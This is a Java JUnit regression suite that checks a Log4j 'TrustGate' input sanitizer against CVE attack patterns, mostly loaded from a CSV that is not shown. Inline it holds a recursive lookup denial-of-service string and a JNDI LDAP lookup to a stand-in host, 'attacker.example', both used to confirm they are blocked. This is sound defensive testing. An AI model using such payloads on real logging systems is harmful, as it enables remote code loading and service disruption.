/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements.  See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to you under the Apache License, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License.  You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.apache.logging.log4j.core.trustgate;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertInstanceOf;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.stream.Stream;
import javax.naming.NamingException;
import org.apache.logging.log4j.core.lookup.AbstractLookup;
import org.apache.logging.log4j.core.lookup.Interpolator;
import org.apache.logging.log4j.core.lookup.StrLookup;
import org.apache.logging.log4j.core.lookup.StrSubstitutor;
import org.apache.logging.log4j.core.net.JndiManager;
import org.apache.logging.log4j.trustgate.DefaultInputSanitizer;
import org.apache.logging.log4j.trustgate.TrustGateException;
import org.apache.logging.log4j.trustgate.ValidationResult;
import org.apache.logging.log4j.trustgate.spi.InputSanitizer;
import org.apache.logging.log4j.trustgate.spi.InputType;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.Arguments;
import org.junit.jupiter.params.provider.MethodSource;
import org.springframework.mock.jndi.SimpleNamingContextBuilder;

/**
 * CVE regression suite for TrustGate validation (WO-010).
 */
class TrustGateCveRegressionTest {

    private static final String TESTKEY = "TrustGateCveRegressionTestKey";
    private static final String TESTVAL = "TrustGateCveTestValue";
    private static final String STRICTNESS_PROPERTY = "log4j2.trustgate.strictness";
    private static final String STRICT_PROPERTY = "log4j2.trustgate.strict";
    private static final String JNDI_LOOKUP_PROPERTY = "log4j2.enableJndiLookup";
    private static final String CSV_RESOURCE = "/trustgate-cve-patterns.csv";

    private String previousStrictnessProperty;
    private String previousStrictProperty;
    private String previousJndiLookupProperty;
    private PrintStream previousErr;
    private ByteArrayOutputStream capturedErr;

    @BeforeEach
    void setUp() {
        previousStrictnessProperty = System.getProperty(STRICTNESS_PROPERTY);
        previousStrictProperty = System.getProperty(STRICT_PROPERTY);
        previousJndiLookupProperty = System.getProperty(JNDI_LOOKUP_PROPERTY);
        System.clearProperty(STRICTNESS_PROPERTY);
        System.clearProperty(STRICT_PROPERTY);
        System.setProperty(TESTKEY, TESTVAL);
        capturedErr = new ByteArrayOutputStream();
        previousErr = System.err;
        System.setErr(new PrintStream(capturedErr, true));
    }

    @AfterEach
    void tearDown() {
        System.setErr(previousErr);
        restoreProperty(STRICTNESS_PROPERTY, previousStrictnessProperty);
        restoreProperty(STRICT_PROPERTY, previousStrictProperty);
        restoreProperty(JNDI_LOOKUP_PROPERTY, previousJndiLookupProperty);
        System.clearProperty(TESTKEY);
    }

    @ParameterizedTest(name = "{0}: {1}")
    @MethodSource("cvePatterns")
    void strictModeSanitizer(
            final String cveId,
            final String description,
            final String pattern,
            final InputType inputType,
            final boolean expectedRejected) {
        final InputSanitizer sanitizer = new DefaultInputSanitizer();
        if (expectedRejected) {
            assertThrows(
                    TrustGateException.class,
                    () -> sanitizer.validate(pattern, inputType),
                    () -> cveId + " pattern should be rejected: " + pattern);
        } else {
            final ValidationResult result = sanitizer.validate(pattern, inputType);
            assertTrue(result.isValid(), () -> cveId + " pattern should be allowed: " + pattern);
        }
    }

    @ParameterizedTest(name = "{0}: {1}")
    @MethodSource("jndiAttackPatterns")
    void jndiManagerRejectsAttackPatterns(final String cveId, final String description, final String pattern)
            throws Exception {
        assertThrows(
                TrustGateException.class,
                () -> new DefaultInputSanitizer().validate(pattern, InputType.JNDI_LOOKUP),
                pattern);
        System.setProperty(JNDI_LOOKUP_PROPERTY, "true");
        SimpleNamingContextBuilder.emptyActivatedContextBuilder();
        try (JndiManager manager = JndiManager.getDefaultManager()) {
            try {
                assertNull(manager.lookup(pattern), pattern);
            } catch (final NamingException ex) {
                assertInstanceOf(TrustGateException.class, ex.getRootCause(), pattern);
            }
        }
    }

    @ParameterizedTest(name = "{0}: {1}")
    @MethodSource("lookupAttackPatterns")
    void strSubstitutorLeavesAttackPatternsLiteral(final String cveId, final String description, final String pattern) {
        final StrSubstitutor subst = createSubstitutor();
        assertEquals(pattern, subst.replace(pattern), pattern);
    }

    @Test
    void recursiveDoSCanonicalPatternRejectedBySanitizer() {
        final String pattern = "${${::-${::-$${::-j}}}}";
        assertThrows(TrustGateException.class, () -> new DefaultInputSanitizer()
                .validate(pattern, InputType.LOOKUP_PATTERN));
    }

    @ParameterizedTest(name = "{0}: {1}")
    @MethodSource("lookupAllowedPatterns")
    void strSubstitutorResolvesAllowedPatterns(final String cveId, final String description, final String pattern) {
        final StrSubstitutor subst = createSubstitutor();
        if (pattern.startsWith("${sys:")) {
            assertEquals(TESTVAL, subst.replace(pattern), pattern);
        } else if (pattern.startsWith("${env:")) {
            final String key = pattern.substring("${env:".length(), pattern.length() - 1);
            assertEquals(System.getenv(key), subst.replace(pattern), pattern);
        }
    }

    @Test
    void permissiveModeLogsWarningsForCvePatterns() {
        System.setProperty(STRICTNESS_PROPERTY, "permissive");
        final DefaultInputSanitizer sanitizer = new DefaultInputSanitizer();
        for (final CvePattern pattern : loadCvePatterns()) {
            if (!pattern.expectedRejected()) {
                continue;
            }
            assertTrue(
                    sanitizer.validate(pattern.pattern(), pattern.inputType()).isValid(),
                    pattern.cveId() + " should be allowed in permissive mode: " + pattern.pattern());
        }
        assertTrue(capturedErr.toString().contains("[TrustGate PERMISSIVE]"));
    }

    @Test
    void permissiveModeInlineJndiDefenseBlocksRemoteSchemes() throws Exception {
        System.setProperty(STRICTNESS_PROPERTY, "permissive");
        System.setProperty(JNDI_LOOKUP_PROPERTY, "true");
        SimpleNamingContextBuilder.emptyActivatedContextBuilder();
        try (JndiManager manager = JndiManager.getDefaultManager()) {
            assertNull(manager.lookup("ldap://attacker.example/jdbc/datasource"));
        }
        assertFalse(capturedErr.toString().contains("TrustGateException"));
    }

    @Test
    void rejectsNullInput() {
        final InputSanitizer sanitizer = new DefaultInputSanitizer();
        assertFalse(sanitizer.validate(null, InputType.LOG_MESSAGE).isValid());
    }

    @Test
    void rejectsEmptyInput() {
        final InputSanitizer sanitizer = new DefaultInputSanitizer();
        assertFalse(sanitizer.validate("", InputType.LOG_MESSAGE).isValid());
    }

    @Test
    void strictModeIsDefault() {
        final DefaultInputSanitizer sanitizer = new DefaultInputSanitizer();
        assertTrue(sanitizer.isEnabled());
    }

    private static Stream<Arguments> cvePatterns() {
        return loadCvePatterns().stream().map(CvePattern::toArguments);
    }

    private static Stream<Arguments> jndiAttackPatterns() {
        return loadCvePatterns().stream()
                .filter(p -> p.inputType() == InputType.JNDI_LOOKUP && p.expectedRejected())
                .map(CvePattern::toArgumentsWithoutType);
    }

    private static Stream<Arguments> lookupAttackPatterns() {
        return loadCvePatterns().stream()
                .filter(p -> p.inputType() == InputType.LOOKUP_PATTERN && p.expectedRejected())
                .filter(p -> !p.pattern().contains("::-"))
                .map(CvePattern::toArgumentsWithoutType);
    }

    private static Stream<Arguments> lookupAllowedPatterns() {
        return loadCvePatterns().stream()
                .filter(p -> p.inputType() == InputType.LOOKUP_PATTERN && !p.expectedRejected())
                .map(CvePattern::toArgumentsWithoutType);
    }

    private static List<CvePattern> loadCvePatterns() {
        final List<CvePattern> patterns = new ArrayList<>();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(
                TrustGateCveRegressionTest.class.getResourceAsStream(CSV_RESOURCE), StandardCharsets.UTF_8))) {
            String line = reader.readLine();
            while ((line = reader.readLine()) != null) {
                if (line.trim().isEmpty()) {
                    continue;
                }
                patterns.add(CvePattern.parse(line));
            }
        } catch (final IOException ex) {
            throw new IllegalStateException("Failed to load " + CSV_RESOURCE, ex);
        }
        return patterns;
    }

    private static StrSubstitutor createSubstitutor() {
        final Map<String, String> map = new HashMap<>();
        map.put(TESTKEY, TESTVAL);
        final StrLookup lookup = new Interpolator(new PropertiesLookup(map));
        return new StrSubstitutor(lookup);
    }

    private static void restoreProperty(final String name, final String value) {
        if (value == null) {
            System.clearProperty(name);
        } else {
            System.setProperty(name, value);
        }
    }

    private static final class CvePattern {

        private final String cveId;
        private final String description;
        private final String pattern;
        private final InputType inputType;
        private final boolean expectedRejected;

        private CvePattern(
                final String cveId,
                final String description,
                final String pattern,
                final InputType inputType,
                final boolean expectedRejected) {
            this.cveId = cveId;
            this.description = description;
            this.pattern = pattern;
            this.inputType = inputType;
            this.expectedRejected = expectedRejected;
        }

        static CvePattern parse(final String line) {
            final String[] fields = splitCsvLine(line);
            if (fields.length != 5) {
                throw new IllegalArgumentException("Invalid CSV line: " + line);
            }
            return new CvePattern(
                    fields[0], fields[1], fields[2], InputType.valueOf(fields[3]), Boolean.parseBoolean(fields[4]));
        }

        String cveId() {
            return cveId;
        }

        String description() {
            return description;
        }

        String pattern() {
            return pattern;
        }

        InputType inputType() {
            return inputType;
        }

        boolean expectedRejected() {
            return expectedRejected;
        }

        Arguments toArguments() {
            return Arguments.of(cveId, description, pattern, inputType, expectedRejected);
        }

        Arguments toArgumentsWithoutType() {
            return Arguments.of(cveId, description, pattern);
        }
    }

    private static String[] splitCsvLine(final String line) {
        final List<String> fields = new ArrayList<>();
        final StringBuilder current = new StringBuilder();
        boolean inQuotes = false;
        for (int i = 0; i < line.length(); i++) {
            final char c = line.charAt(i);
            if (c == '"') {
                inQuotes = !inQuotes;
            } else if (c == ',' && !inQuotes) {
                fields.add(current.toString());
                current.setLength(0);
            } else {
                current.append(c);
            }
        }
        fields.add(current.toString());
        return fields.toArray(new String[fields.size()]);
    }

    private static final class PropertiesLookup extends AbstractLookup {

        private final Map<String, String> properties;

        PropertiesLookup(final Map<String, String> properties) {
            this.properties = properties;
        }

        @Override
        public String lookup(final String key) {
            return properties.get(key);
        }

        @Override
        public String lookup(final org.apache.logging.log4j.core.LogEvent event, final String key) {
            return lookup(key);
        }
    }
}
